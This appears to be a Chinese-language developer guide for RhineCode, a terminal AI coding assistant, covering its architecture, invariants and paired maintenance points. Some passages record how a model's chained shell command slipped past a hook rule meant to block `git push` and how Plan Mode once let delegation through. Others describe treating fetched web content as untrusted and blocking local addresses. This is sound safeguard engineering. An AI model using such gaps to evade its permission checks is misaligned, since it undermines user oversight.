# RhineCode

RhineCode 是一个用 Python + Textual 实现的终端 AI 编程助手，交互体验参考 Claude Code。

## 这份文件怎么用

**主文件是索引 + 「必须不请自来」的内容**，细节分册在 `docs/internals/`，按需读取。

改代码前先看两处：[架构](#架构)的分层速查表（定位到层，⚠ 列标出致命不变量）与
[成对维护点](#成对维护点)（改一处必须同步另一处，**漏改一律不报错**）。

| 分册 | 什么时候读 |
| --- | --- |
| [`internals/architecture.md`](docs/internals/architecture.md) | 要动某一层的实现，想知道它内部怎么分模块、为什么这样分 |
| [`internals/capabilities.md`](docs/internals/capabilities.md) | 想知道某个能力的**实际行为与边界**：阈值多少、失败怎么降级、哪些 Provider 生效 |
| [`internals/testing.md`](docs/internals/testing.md) | 要加/改测试，或想知道某个行为**有没有护栏钉着** |
| [`internals/config.md`](docs/internals/config.md) | 要动配置加载、新增配置项或模板生成 |
| [`docs/c13/README.md`](docs/c13/README.md) | **当前章节**（C13 子 Agent 系统）的 spec/plan/task/checklist |
| [`docs/c12/README.md`](docs/c12/README.md) | C12（Hook 系统）的四份文档 |
| [`docs/c11/README.md`](docs/c11/README.md) | C11 的四份文档与验收记录导航 |
| [`docs/extensions/README.md`](docs/extensions/README.md) | **工具/能力扩展**（不占章节号）的文档在哪、以及「该开新章节还是算扩展」怎么判 |
| [`docs/todo/README.md`](docs/todo/README.md) | **下一步做什么** —— 待选方向，按优先级编号，每份自带可一键复制的开工 Prompt |

留在主文件里的都是**不请自来才有用**的东西：成对维护点、安全边界、代码注释规范、
学习与解释要求、已知后续工程项。索引解决「我要查点东西」，解决不了
「我不知道自己需要知道」——所以这几类不能挪进分册。

当前主线到 **C13**，以 DeepSeek Provider 为主。能力自下而上分层，每一层都仍在生效：

| 章节 | 能力 | 一句话 |
| --- | --- | --- |
| C4 | Agent Loop 与 Plan Mode | ReAct 循环：调模型 → 执行工具 → 回灌结果 → 再调模型，直到自然完成或命中停止条件 |
| C5 | 结构化系统提示 | 八个固定模块走稳定可缓存通道（第八个「外部不可信内容」随 web_fetch 扩展加入、按开关注入），环境信息与提醒经 `<system-reminder>` 动态注入 |
| C6 | 五层防御权限系统 | 每次工具执行前由**代码**（非模型/prompt）算「放行 / 拒绝 / 问用户」；被拒不终止循环，结构化原因回灌模型 |
| C7 | MCP 客户端 | 启动时连外部 MCP Server（stdio / Streamable HTTP），把远端工具包装成已有 `Tool` 接口注册进工具中心，对上层完全无感 |
| C8 | 上下文管理（两层压缩） | 每次请求前「锚点 + 增量」估算用量；第一层把过大工具结果存盘留占位，第二层调 LLM 把早段压成结构化摘要。幂等、fail-safe、连续失败 3 次熔断，用户原始消息永不改写 |
| C9 | 记忆系统 | 三层 RHINE.md 项目指令（含 `@include` 展开）+ 每条消息即时 JSONL 存档与容错恢复 + Agent 自然停止后异步沉淀四类笔记；多实例由锁文件防护 |
| C10 | 斜杠命令系统 | 单一 `CommandSpec` 注册表同时驱动执行 / `/help` / 补全 / 高亮；本地与界面命令绕过 Agent，未知命令不进 AI |
| C11 | Skill 系统 | 把重复输入的提示词封装成独立 Markdown 文件（三级存放、两阶段加载、`context: fork` 子对话、`allowed-tools` 预授权、自动注册短命令）。**已对齐 Agent Skills 开放标准**，外部 Skill 目录复制进来即可用。字段与行为细节见下一节 |
| C13 | **子 Agent 系统** | 主 Agent 把子任务委派给独立上下文的子 Agent，只拿回结论。两条路径：**定义式**（Markdown+frontmatter 定义的角色，从空白对话起步）与**分支式**（继承父历史快照、强制后台）。子 Agent 一律独立线程运行、**全程非交互**（判 ASK 自动拒绝）、能力**只会比主对话小**（工具集三层过滤 / 权限只能收紧 / 不继承回合级预授权）。**委派永不阻塞**（多个委派天然并行），结论在 Agent Loop 的**每轮迭代**注入主历史，且模型准备收工时循环会停下来等它。内置三个角色：`explorer`（只读调研）/ `planner`（只读方案）/ `general-purpose`（全工具执行） |
| C12 | **Hook 系统** | 在生命周期的固定节点上挂用户声明的自动化动作。一条规则 = **事件 + 条件（可省）+ 动作**，从两层 YAML 加载。十二个事件覆盖会话 / 回合 / 消息 / 工具四层加三个系统级；四种动作（shell 命令 / 注入提示词 / HTTP / 子 Agent 占位）；三种执行控制（只跑一次 / 后台异步 / 超时）。**`pre_tool_use` 可拦截，且只能收紧不能放宽**——详见下一节与「安全边界」 |

### C13 的角色定义格式（不请自来才有用，故留在主文件）

一个角色 = 一个 Markdown 文件，放在 `<项目根>/.rhinecode/agents/` 或
`~/.rhinecode/agents/`（优先级 项目 > 用户 > 内置）。frontmatter **只有
`description` 必填**：

| 字段 | 语义 |
| --- | --- |
| `name` | 角色标识。**缺省取文件名**——与 C11「命令名来自路径」刻意相反，为的是让从 Claude Code 生态复制来的定义（文件名可以与 `name` 不一致）原样可用 |
| `description` | **必填**。什么时候该委派给它——这是主 Agent 选角色的唯一依据 |
| `tools` | 工具白名单。**省略 = 继承主对话工具集**，写成 `[]` = 一个都不给（会让委派直接失败） |
| `disallowed_tools` | 黑名单，在白名单结果上再减 |
| `model` | `inherit`（缺省）或具体模型名 |
| `max_turns` | 迭代上限，缺省 15，硬顶 25（越界只夹取并警告） |
| `permission_mode` | 声明档位。**写放行档不产生提权效果**，实际生效取 `min(主对话档, 本值)` |

连字符与下划线两种写法都认。Claude Code 有而本项目不支持的八个字段
（`skills` / `memory` / `isolation` / `color` / `hooks` / `mcp_servers` /
`background` / `effort`）**只产生具名警告、不阻断加载**——用户是从别处复制来的，
他需要知道具体哪一项没生效。正文是该角色的系统提示，**可以为空**
（只靠工具白名单收窄行为的角色是合法的）。

**内置三个角色**（对标 Claude Code 的 `Explore` / `Plan` / `general-purpose`）：
`explorer` 与 `planner` **工具集完全相同**（都是那三个只读工具），差别全在描述与
正文里——所以 `planner` 的正文**必须显式点破它与调研员的区别**（「回答接下来该
怎么做」而非「现在是什么样」），否则它会退化成第二个 `explorer`。
`general-purpose` 继承全部工具，但它的写入在缺省档下会被自动拒绝，
因此 `description` 里**必须写明这一点**——那是主 Agent 选角色的唯一依据。

⚠️ **术语提醒**：C13 的 `type: branch`（继承父历史）与 C11 的 `context: fork`
（空白历史）**语义相反**，两者都叫 fork 会长期误读，故 spec 一律写
「定义式 / 分支式」。trace 作用域也分开：`isolated:<name>` vs `subagent:<name>`。

**已实现的扩展**（不占章节号，文档在 `docs/extensions/`）：

- **网络访问工具 `web_fetch`** ——给一个地址与一段「要提取什么」的说明，取回正文并按提问抽取要点。它同时在权限管线里新增了**②′网络边界层**（结构性硬校验 + 域名策略），并把抓回的内容当作不可信输入对待。行为细节见 [`docs/extensions/web-fetch/`](docs/extensions/web-fetch/spec.md)。
- **Skill 作者期** ——对齐改造让 Skill **可导入**，这个扩展让它**可创作**。两件事：① **体检**（`skills/audit.py`，纯函数零 IO）八项检查，产出**可操作建议**（「建议改成 xxx」而非「警告：xxx」），并入 `/skills` 报告作为第四类反馈；② 内置 **`skill-creator`** 样板（目录型，带完整字段手册作随附资源），承担创作 / 适配外部 Skill / 按建议修复三种用途，全部落盘走完整权限管线。另有 **R 系列增补**专治「Skill 写对了却没被自动加载」——清单表头从「公告」改成「指令」（照 Claude Code 口径：命中就先加载、**用它替代默认做法**、用户不必点名、拿不准就加载）、修掉 `load_skill` 一处**压制加载**的过期描述、内置样板说明改**触发词前置**、清单超预算时**保名字只砍描述**。⚠️ 「模型欠触发 Skill」是**已知的系统性偏差**（Anthropic 官方指导：描述要写得「有点 pushy」），不是本项目独有的 bug。行为细节见 [`docs/extensions/skill-authoring/`](docs/extensions/skill-authoring/spec.md)。

另有一套**跨阶段的测试设施**（不占章节号、缺省关闭、不进产品包）：**Trace 行为记录器**（`--trace`）把运行过程写成十五类结构化事件的 JSONL 配只读阅读器；**端到端驱动设施**（`tests/e2e/`）起常驻宿主让 Claude 经本机回环通道自己驱动界面跑完整交互闭环。两者都用于验收既有能力与排查那类「界面上看不出、但行为确实不对」的问题。

Anthropic / OpenAI Provider 目前保持纯对话能力；工具调用、Plan Mode、权限系统、Skill 仅在 `protocol: deepseek` 且启用默认工具注册中心时可用。

## 语言
中文回答

## 技术栈

- Python 3.11+
- [Textual](https://textual.textualize.io/) — TUI 框架（流式渲染基于 Worker + `call_from_thread`）
- `anthropic` / `openai` SDK，`pyyaml` 配置
- `httpx` — MCP Streamable HTTP 传输的 SSE 流式读取（c7）
- 依赖与入口定义在 `pyproject.toml`，控制台脚本 `rhinecode`

## 当前能力

各能力的**实际行为与边界**（阈值、降级路径、哪些 Provider 生效）见
**[`docs/internals/capabilities.md`](docs/internals/capabilities.md)**。
上面的能力表回答「有什么」，那份文档回答「具体怎么表现」。

需要立刻知道的两条：

- 工具调用、Plan Mode、权限系统、Skill **仅在 `protocol: deepseek`** 且启用默认工具注册中心时可用；
  RHINE.md 注入与会话存档/恢复对所有 Provider 生效。
- Skill 的 `allowed-tools` 是**预授权**（列出的操作在本次执行内免确认），
  **不限制**模型能调用什么。要限制请用 `permissions.yaml` 的 deny 规则。

## 架构

详解在 **[`docs/internals/architecture.md`](docs/internals/architecture.md)**。
改某一层之前，也可以直接读那个模块的 docstring——本项目强制详尽中文注释，
架构详解里的大部分说明在源文件里都有一份，且源文件不会过期。

**⚠ 那一列是「违反即出事」的不变量。** 它留在主文件里是刻意的：索引解决的是
「我要查点东西」，解决不了「我不知道自己需要知道」。看到 ⚠ 就说明动这一层之前
必须先去读详解或源码。

| 层 | 路径 | 职责 | ⚠ 致命不变量 |
| --- | --- | --- | --- |
| TUI | `tui/` | Textual 界面；Worker 消费 AgentEvent 逐块渲染；实现 `CommandController` 协议 | **markup 转义必须用 `tui/widgets.py` 的 `escape`**，绝不用 rich 那版——落单的 `[` 会在布局阶段主线程抛 `MarkupError`，**没有 try/except 兜得住，整个 app 退出** |
| Commands | `commands/` | 斜杠命令注册与分发（纯逻辑，不依赖 Textual） | `_specs` 是两个列表的只读拼接，**写入必须直接操作其中之一**——对属性 append 不报错也不生效 |
| 协调层 | `conversation.py` | TUI 与 Agent/Provider 的中转；历史、权限引擎、四类回调、上下文/记忆/Skill 接线 | 预授权**先取令牌再授予**；`clear()` 与 `_resume_stream` 两处必须清空 Skill 激活态 |
| Agent | `agent/` | ReAct 循环、事件类型、流式收集、结构化系统提示 | `dynamic` 是**每轮求值**的 callable，改回取值型会让两阶段加载失效；trace 埋点一律走 `_safe_emit` 漏斗 |
| Permission | `permission/` | 五层防御的纯逻辑引擎 | 第③层规则**必须排在①黑名单②沙箱之后**——这是预授权安全性的全部依据。**②′网络边界层同理必须排在③之前**：晚于③会让一条 `allow: WebFetch(domain:*)` 在③层先行放行，`file://` 与 `127.0.0.1` 整个跳过硬校验。注意理由**不是**「白名单会失效」（那是错的，两种顺序下白名单结论相同）——正因如此，顺序护栏必须用「全域名 allow + 禁止地址」构造，实测「白名单未命中」那种形态在错序下照样通过 |
| MCP | `mcp/` | 配置、JSON-RPC、两种传输、工具适配、多 Server 编排 | stdio 的 stderr 必须后台 drain，否则 Server 写日志会把子进程写阻塞 |
| Memory | `memory/` | 锁原语、RHINE.md 加载、会话存档、笔记与索引 | 写盘权收拢在 manager 的锁临界区内——拿锁的人就是写盘的人 |
| Hooks | `hooks/` | Hook 规则的解析/条件求值/动作执行/分发编排 | 两条：**Hook 只能收紧不能放宽**（`HookDecision` 里没有 ALLOW，`_apply_hook_ask` 只把 ALLOW 升级为 ASK、绝不降级 DENY）——这是本章全部安全论证的依据；**加锁临界区只做纯内存读写**，动作执行、埋点、跨线程调度一律在锁外，违反会让一个 60 秒超时的命令锁死整个 manager，界面假死而调用栈上无线索 |
| SubAgents | `subagents/` | 角色解析/三层扫描/工具过滤/任务表/运行器/服务门面（c13） | 三条：**权限必须 `derive()` 派生，绝不改主引擎的 `mode`**——引擎是单实例共享、`mode` 与 `turn_rules` 都可变，后台线程改它等于静默改掉主对话的权限档位，界面上完全看不出来；**`TaskManager` 加锁临界区只做纯内存读写**，`Event.set()` 一律在锁外（它唤醒等待线程，属跨线程调度），且本类**刻意不持有任何回调**、从结构上杜绝违反；**运行器绝不调 `hooks.consume_injections()`**——那是个会被取走的队列，子 Agent 消费它会让主对话的注入型 Hook 凭空消失 |
| Skills | `skills/` | Skill 解析/发现/渲染/预授权翻译/激活编排（叶子包） | **加锁不变量**：临界区只做纯内存读写，一切回调与跨线程调度在锁外——违反会与 Textual 阻塞式 `call_from_thread` 组成**确定性死锁，整个 TUI 冻结** |
| Context | `context/` | 两层压缩：估算、工具结果存盘、LLM 摘要 | `allow_summary` 必须在 `and` 链最前面短路——锚点对应主历史，拿它估子对话毫无意义 |
| Trace | `trace/` | 行为记录器（**跨阶段测试设施**，叶子包只依赖标准库） | 序列化+写入+flush+序号推进必须在**同一临界区**，且**序号只在 flush 成功后推进** |
| 驱动设施 | `tests/e2e/` | 端到端驱动（**跨阶段测试设施**，不进产品包） | `control.py` 四条不变量（加锁四段式 / `wait` 不持锁 / 应答前复核面板就绪 / 跨线程只走 `run_on_main`） |
| 装配层 | `bootstrap.py` | `build_app` 按固定顺序组装，致命错误抛 `BootstrapError` | 装配顺序**一处不动**；`exclude_tools` 摘除必须在 `session_start` 快照之前 |
| Provider | `provider/` | `BaseProvider` 抽象与三个实现，`create_provider` 按 `protocol` 分发 | — |
| Tools | `tools/` | `Tool` 抽象、注册中心、路径边界与各内置工具 | `tools/__init__.py` **必须保持为空**，否则 `tools ↔ skills`、`tools ↔ mcp` 的包级互依会成环 |

依赖方向总原则：上层可依赖下层，反之不可。`skills` / `trace` 是叶子包；
`commands` 不被 conversation/memory/context/provider 反向依赖。
`subagents` **不依赖** `conversation` / `tui` / `commands`——运行子 Agent 所需的外部
依赖由协调层打包成 `SubAgentRuntime` 注入（护栏见 `test_subagent_report.py`）。

## 成对维护点

**改一处就必须同步另一处的地方。** 这一节是全文对防 bug 最有用的部分——下面每一条
都对应一次真实踩过的坑，共同点是**漏改不报错**：编译过、测试绿、界面正常，
只是某个行为悄悄不对了。动到相关代码前先在这里搜一下关键词。

- **改动角色正文里「结论怎么回流」的说法（c13）** → 必须与 `runner._extract_conclusion` 的实际口径一致：它取的是**最后一条 assistant 消息的全文**，不是「最后一段」。三个内置角色正文 + `SUBAGENT_CONVENTIONS` 都得同口径。**说错了不报错**，只是模型照着字面理解、在结论前面写一堆过程叙述，而那些全都会被带回主对话（真实模型实测过）。护栏见 `test_subagent_builtin.py::test_body_says_the_whole_reply_is_returned`
- **子 Agent 的产品级约定写在运行器里，不写进角色正文** → `subagents/runner.py` 的 `SUBAGENT_CONVENTIONS`。语言约定与结论长度这两条与角色是谁无关；写进内置角色正文的话，**用户自己写的角色一个都盖不到**。⚠️ 子 Agent 的系统提示只有角色正文，`RHINE.md` 里的项目约定（比如「用中文回答」）**到不了它**
- **新增「规划阶段仍可用」的工具（c13）** → 声明 `Tool.plan_safe = True` + **该工具的 `execute` 必须接受 `plan_stage: bool` 关键字参数**（循环会传）。⚠️ 声明它等于承诺「规划阶段不产生副作用」，工具**必须自己兑现**——循环只负责把阶段告诉它。另：规划阶段守卫的豁免条件是 `plan_safe`，**不是 `system_serial`**（那条豁免原本为 `load_skill` 写、长期空转，被 `run_agent` 激活后成了 Plan Mode 的漏洞，实测规划阶段真的执行了委派）。护栏见 `tests/test_subagent_plan_stage.py::PlanGuardTest`（两个假工具只差这一个标志、行为必须相反）
- **改动子 Agent 闸门的协议（c13）** → `agent/gate.py`（协议 + `NullGate`）+ `subagents/gate.py`（实现）+ `agent/loop.py` 的两处调用点（迭代级 `take_pending` / 收工前的 `has_awaited`+`wait_any`）。⚠️ **协议必须留在 `agent/` 这一侧**：`agent` 依赖 `subagents` 会直接撞循环导入（`agent.loop` → `subagents/__init__` → `runner` → `agent.loop`），实测报错 `cannot import name 'Agent' from partially initialized module`
- **子 Agent 结论的渲染只有一份** → `subagents/gate.py` 的 `render_subagent_message`。闸门（迭代级交付）与协调层的 `_deliver_subagent_results`（跨用户消息的兜底）**共用它**，各拼一次标记块的话会出现「同一条结论在历史里长得不一样」
- **新增角色 frontmatter 字段（c13）** → `subagents/models.py` 的 `AgentSpec` 字段 +（若本项目仍不支持）`UNSUPPORTED_FIELDS` + `subagents/parser.py` 的读取与归一 + `subagents/report.py` 的展示。**漏删 `UNSUPPORTED_FIELDS` 里那一项的后果最迷惑**：功能已经做了，用户却被告知「本项目不支持该字段，已忽略」。护栏见 `test_subagent_parser.py::UnsupportedFieldsTest`（遍历常量表逐个断言）
- **新增「任何子 Agent 都不该看到」的工具（c13）** → `subagents/toolset.py` 的 `GLOBAL_DENIED_TOOLS`。**漏改不报错**，只是子 Agent 多出一个能力，而配置和界面上都看不出异常。那一层排在角色白名单**之前**是刻意的——反过来的话，一条 `tools: run_agent` 就能让子 Agent 拿到委派能力、无限嵌套下去。护栏见 `test_subagent_toolset.py`（遍历该集合逐个断言，新增项自动被覆盖）
- **改动角色清单表头或委派工具的描述（c13）** → `subagents/render.py` 的 `_INDEX_HEADER` + `tools/run_agent.py` 的 `description`。**两处必须同口径**（命中就委派 / 替代自己动手 / 用户不必点名 / 拿不准就委派 / 说明上下文成本）——它们是模型决定「要不要委派」时读的**唯一两处文本**，一处强一处弱等于白改。这与 C11 的 `_INDEX_HEADER` ↔ `load_skill.description` 是**同一个坑的第二次**。护栏见 `test_subagent_tool.py::SameVoiceTest`
- **`build_default_prompt` 新增调用点** → 必须传 `untrusted_enabled=self._config.web_fetch_enabled`。**c13 起是三处**（主对话 `_run` / fork 子对话 `_run_forked_skill` / **分支式子 Agent 的父快照 `parent_snapshot`**）。漏传的表现是「主对话有不可信约束、某条子对话没有」，界面上完全看不出来。护栏见 `test_web_bootstrap.py`（数源码里的出现次数，新增调用点当场红）。⚠️ **定义式子 Agent 不走这条链**——它按 spec F7 只拿角色正文 + 环境信息，那道约束由 `subagents/runner.py` 的 `_build_prompts` 在「最终工具集含网络访问工具」时单独追加
- **新增 Hook 事件** → `hooks/models.py` 的 `HookEventType`（枚举）+ **同文件的 `EVENT_FIELDS`** + 该事件的负载构造点。**漏改 `EVENT_FIELDS` 不报错**，只是用户在条件里写对了字段名反而被判为非法、整条规则被丢弃——用户只会以为是自己写错了。（三个工具级事件的字段集是**开放**的，见 `OPEN_INPUT_EVENTS`：`tool_input` 的键取决于是哪个工具，加载期不可能枚举，故对它们放行未登记字段名；代价是那三个事件上的字段笔误加载期发现不了，只表现为「这条规则永远不命中」，排查靠 `/hooks` 里的触发次数恒为 0）
- **新增 Hook 动作类型** → `hooks/models.py`（数据类）+ `hooks/parser.py`（校验分支）+ `hooks/actions.py`（执行器）+ **`hooks/report.py` 的 `describe_action`**。**漏改最后一处不报错**，只是 `/hooks` 与**项目级启动提示**里那条动作显示成「未知动作」——而项目级提示逐条展示命令原文正是 spec F9.1 的**全部安全价值**，显示不出内容等于那道防线没了
- **命令类字段的匹配必须「整条 + 逐段」双重检查** → `hooks/conditions.py` 的 `_match_command_field`。`match_command` 是**整串匹配**、不拆复合命令（它自己的 docstring 明写「调用方按需先 `split_commands`」）。只调它的话，一条 `command: "git push *"` 的拦截规则会被 `git add x && git commit -m y && git push origin main` 整个绕过——**而这不是攻击者构造的**，是真实模型在一次普通「改完提交推上去」的请求里自然产出的形态（C12 验收期实测）。后果比「少拦一次」更糟：`/hooks` 里那条规则显示「触发：0 次」，用户会据此认定「模型压根没试过」。护栏见 `tests/test_hook_conditions.py::CompoundCommandTest`
- **新增可 glob 匹配的 Hook 字段** → `hooks/models.py` 的 `FIELD_MATCH_KIND`。**漏改不报错**，只是该字段从「命令/路径语义匹配」悄悄退化成通用通配——词边界丢失后 `git *` 会连 `github-cli` 一起命中，而配置和界面上都看不出异常
- **新增 `_interact` 的交互种类** → `tui/app.py` 的 `_NOTIFY_KINDS`。两套词汇**刻意不合一**（内部结算标识 vs 写进用户 `hooks.yaml` 的稳定契约，合并会让「改一个内部标识」变成「破坏用户配置」）。漏改不报错，只是那种面板弹出时 `notification` 的 `kind` 退回内部标识，用户按文档写的条件匹配不上
- **Hook 的 `post_tool_use` / `post_tool_use_failure` 只能挂在 `OUTCOME_EXECUTED` 旁**（`agent/loop.py` 两处）。六种「压根没执行」的分支一个都不能挂——把「没跑」混进「跑了但失败」会让「统计工具失败率」这类用途直接失真，而且不报错。护栏见 `tests/test_hook_intercept.py::NoExecutionBranchesTest`
- **新增系统提示槽位** → `agent/prompt/modules.py` 的 `optional_slots` + `agent/prompt/builder.py` 的参数与 `_FILLED` 元组。**漏改 `_FILLED` 不报错**，只是那个槽位会被添加两次（一次填了内容、一次是空槽）。另：进稳定通道的槽位**按「越稳定越靠前」排序**——前缀缓存是「从第一处变化起全部失效」，故 c13 的角色清单是 135、排在会随 `/skills reload` 变化的 Skill 清单（140）之前
- 新增工具 → `tools/registry.py`（注册）+ `permission/adapter.py`（权限映射，按需）+ 若要在 `allowed-tools` 里可写，还要在 `skills/validation.py` 的 `_TOOL_ALIASES` 加一行
- **改动 Skill 清单表头或 `load_skill` 的工具描述** → `skills/render.py` 的 `_INDEX_HEADER` + `tools/load_skill.py` 的 `description`。**两处必须同口径**（命中就先加载 / 替代默认做法 /用户不必点名 / 拿不准就加载）——它们是模型决定「要不要用 Skill」时读的**唯一两处文本**，一处强一处弱等于白改。⚠️ 那句「替代你自己的默认做法」不可省：少了它，模型会把 Skill 当成「另一种可选做法」而不是「该走的那条路」。两处各有护栏（`test_skill_render.py` / `test_skill_manager.py`）
- **新增一项 Skill 体检检查** → `skills/models.py` 的 `AdviceKind`（枚举）+ `skills/audit.py`（判定与措辞）。**漏了枚举不报错**，只是那条新检查在测试里没法精确断言，用例只能退回 `assertIn("某个词", report)` 这种脆弱写法——而措辞恰恰是这类建议要反复打磨的东西，改一次碎一批测试，人的第一反应会是把断言放宽成谁都能过
- **新增一个「只读」工具类别** → `skills/validation.py` 的 `_TOOL_ALIASES` + `skills/models.py` 的 `READ_ONLY_GRANT_TOOLS`。**漏改的后果是「多报一条预授权过宽」**——这是**刻意选的偏严方向**：反过来维护「有副作用清单」的话，将来新增一个有副作用的工具忘了登记就会**静默漏报**；现在这个方向下遗漏是可见的、用户会来问。仍要登记，否则下一个人会以为那条误报是 bug
- **新增一种权限请求 `kind`** → `permission/adapter.py` 的 `_TOOL_MAP`（映射）+ **同文件的 `to_allow_rule`**（「本会话/永久放行」要登记成什么规则）。**漏改后者不报错**：本次调用照常放行，要到下次启动才发现那条永久规则是废的（url 类踩过——原写法会写出 `WebFetch(https://x/a?token=abc)`，既非法又把令牌写进配置文件）
- **新增禁止的网络地址范围** → `permission/network.py` 一处即可（判定期与连接期**共用**同一份实现），**别在 `web/fetcher.py` 里另写一份**
- **新增 `Layer` 枚举值** → `permission/models.py`（枚举）+ `trace/reader.py` 的 `_LAYER_NAMES` + `tui/widgets.py` 的 `ConfirmPanel._LAYER_LABELS`。**三份表刻意不合一**——合并要让只依赖标准库的 `trace` 叶子包反向依赖 `permission`（实测 `import permission.models` 会连带拉起整个包 + `rhinecode.tools` + `yaml`），破坏架构不变量。一致性由 `tests/test_trace_reader.py` 与 `tests/test_web_bootstrap.py` 里两条遍历 `Layer` 的断言钉住，**漏改当场红**
- **`engine.decide` 新增 return 路径** → 必须填 `DecisionResult` 的 `kind` / `host`（现用 `_verdict` 闭包做唯一出口）。**漏填不报错**：确认面板的 URL 专用分支永不进入、长地址仍被截断，而这在真机弹面板之前完全看不出来
- **`tools/web_fetch.py` 是 `tools ↔ web` 包级互依的第三个依赖方** → `rhinecode/tools/__init__.py` 必须继续不 re-export 任何子模块
- 新增 MCP 传输方式 → `mcp/transport.py`（`Transport` 子类）+ `mcp/manager.py` `_build_transport`（按 `kind` 分支）
- 新增斜杠命令 → 只需 `commands/builtins.py` 登记一条 `CommandSpec` + 处理函数 + 测试（c10 单一注册来源；补全/帮助/高亮自动生效）
- 新增 `ModeTarget` / `ReportTarget` 枚举值 → `commands/models.py`（枚举）+ `tui/app.py` `switch_mode`/`query_report`（分支，未知值明确抛错）+ `conversation.py`（对应领域方法）
- 新增状态栏展示字段 → `tui/widgets.py` 的 `compose_status_text`（渲染）**与 `StatusBar.update_status`（签名 + 转发，两处都要改）** + `tui/app.py` `_refresh_status`（取值传入）；命令触发的刷新由处理函数调 `refresh_status()`，无白名单
- 新增确认/交互态 → `agent/events.py`（枚举）+ `tui/widgets.py`（面板选项 id）+ `tui/app.py`（id→枚举映射）+ `conversation.py`（回调闭包处理）
- **工具行的「建行 / 定色」必须成对**，且 `_do_stream` 的 `tool_widgets` 表**只装还没定色的行**：`TOOL_PENDING` 建行、`TOOL_START` 复用（`get` 后 `begin_running`）、`TOOL_RESULT` **必须 `pop`**、`finally` 里 `_settle_unfinished_tools` 收尾剩下的。**把 `pop` 写成 `get` 不报错**：已经定成绿色「完成」的行会在收尾时被再收一次、覆写成「失败 · 未执行」——用户看到的是「明明写成功了却显示没执行」，而调用栈上什么线索都没有。护栏见 `tests/test_tui_tool_pending.py::DoStreamWiringTest`（含这条覆写的反证）
- **`ToolCallWidget` 的 `(Ns)` 语义是「工具执行耗时」** → `begin_running` 必须重置 `_start`。漏了不报错，只是把「模型生成参数」与「用户盯着确认面板发呆」的时间一并算进去，一次 2 毫秒的写盘可能显示成 `(600s)`
- 新增 RHINE.md 层级或记忆目录 → `memory/instructions.py` / `memory/manager.py`（加载逻辑）+ `/memory` 报告（`memory_report`）+（涉及模型按需读取时）`path_guard` 只读白名单注册（`conversation.py`）
- 新增 Skill 内置样板 → `rhinecode/skills/builtin/*.md` + `tests/test_skill_manager.py::BuiltinSamplesTest`（**它硬编码了样板名字清单，漏改当场红**）+ 跑一次体检确认新样板**自身零建议**（它是用户能看到的唯一范例，自己触发建议等于示范了不该学的写法；**刻意不建自动化断言**，理由见 `docs/extensions/skill-authoring/spec.md` F6）。
  ⚠️ **`pyproject.toml` 的 package-data 不是必须改的**——原先这里写着「漏改会让真安装后样板凭空消失」，作者期扩展**实测推翻了这句**：本项目用纯 pyproject.toml 配置，setuptools≥61 在这种配置下 `include-package-data` **默认为真**，包目录内的非 `.py` 文件本来就会一并打包（四组对照实测记在 `pyproject.toml` 的注释里）。那段 package-data 现在的定位是「万一有人关掉 `include-package-data` 时的兜底」。**验它必须先 `rm -rf build`**，否则 setuptools 复用上次产物，验的是上一次的配置
- **预授权的授予与撤销必须成对**，且撤销放在 `finally`：`_wrap_events` 是每一次 Agent 执行的唯一包装点，三条路径（主对话 / 用户触发的子对话 / 模型自行发起的子对话）都经过它。**撤销用 `restore_turn_rules(token)` 回滚而不是 `revoke_turn_rules()` 清空**——授权会嵌套（模型在主对话里发起 fork 时内层若清空，会把外层那次执行的授权也抹掉，外层剩下的轮次突然开始弹本不该弹的确认面板，界面上看不出任何异常）
- **新增 Skill frontmatter 字段** → `skills/models.py`（`SkillSpec` 字段 + 若无对应能力则登记进 `UNSUPPORTED_FIELDS`）+ `skills/parser.py`（读取与归一）+ `skills/render.py`（若要进清单）；连字符写法要能被 `_normalize_keys` 认出
- **命令名的来源是文件系统路径，不是 frontmatter** → 改动 `discovery.py` 的推导逻辑时，`跨层覆盖键`、`短命令注册`、`/skills 报告` 三处的「同一个 Skill」判定都跟着它走
- `rhinecode/tools/__init__.py` **不得 re-export 任何子模块**：`tools ↔ skills` 与 `tools ↔ mcp` 都是包级互相依赖，不成环唯一依靠这个文件是空的
- `SkillManager` 持锁期间**禁止任何回调与跨线程调度**：违反会与 Textual 阻塞式 `call_from_thread` 组成确定性死锁，整个 TUI 冻结
- Skill 短命令的两处注册必须同口径：`__main__` 启动时一次、`RhineApp.reload_skills()` 热更新时一次（都走 `build_skill_command_specs` + `replace_skill_commands`，且都要把 skipped 的冲突项提示成 `/skills run`）
- 启动接线中 `LoadSkillTool` 必须在算 `known_tools` **之前**注册，且整段 Skill 校验必须夹在 `MCPAddServerTool` 注册之后、`connect_all` 之前（两头都不能挪，理由见 `__main__.py` 注释）
- 状态栏/历史区文本含字面 `[`（如 `[provider]`）→ 必须转义为 `\[`，否则被 Textual markup 当标签吞掉
- **任何往 markup 串里嵌纯文本的地方，一律用 `tui/widgets.py` 的 `escape`，绝不要 `from rich.markup import escape`**：rich 那版只转义「看起来像完整标签」的 `[...]`（正则要求闭合的 `]`），因此**被截断的括号会被它整个放过**；而 Textual 的 Content markup 比 Rich 严格，会把落单的 `[` 当标签开头并抛 `MarkupError`——抛出点在 `OptionList.get_content_height` 这类**布局阶段的主线程**调用里，不在业务调用栈上，没有任何 try/except 兜得住，**Textual 直接拆掉整个 app、程序退出**。真实现场：`summarize_args` 先截断后转义，把 `allowed_tools: [read_file, glob_files, …]` 切成 `allowed_tools: [read_file, glo…`，`edit_file` 的 `old_string`+`new_string` 天然成对凑够两个未闭合括号（一个不够，实测 Textual 容忍），确认面板一弹就崩。护栏见 `tests/test_tui_markup_escape.py`（含现场重演与「旧口径确实会崩」的反证）
- 新增 trace 事件类型 → `trace/models.py`（`TraceEventType` 枚举）+ `trace/reader.py` 的 `SUMMARIZERS`「type → 摘要函数」表（**漏了不报错**，只会让新事件在阅读器里显示成「（未登记类型）」——那句话就是为暴露这个遗漏而刻意保留的）
- `bootstrap.build_app` 的装配顺序 → 那段「位置为什么卡在这个窄窗口里 / 两头都不能挪」的理由注释**必须随代码走**；迁代码留注释等于把知识丢了。**窗口里现在只剩一件事**：P1a 的 `exclude_tools` 摘除，理由是「往后挪会让 `session_start` 快照与实际工具集不符」。另半件（C11 的 Skill 白名单 fail-fast）已随对齐改造删除——`allowed-tools` 现在认不出的项只警告不终止，`bootstrap.py` 里留着那段删除说明，别再照着它推理
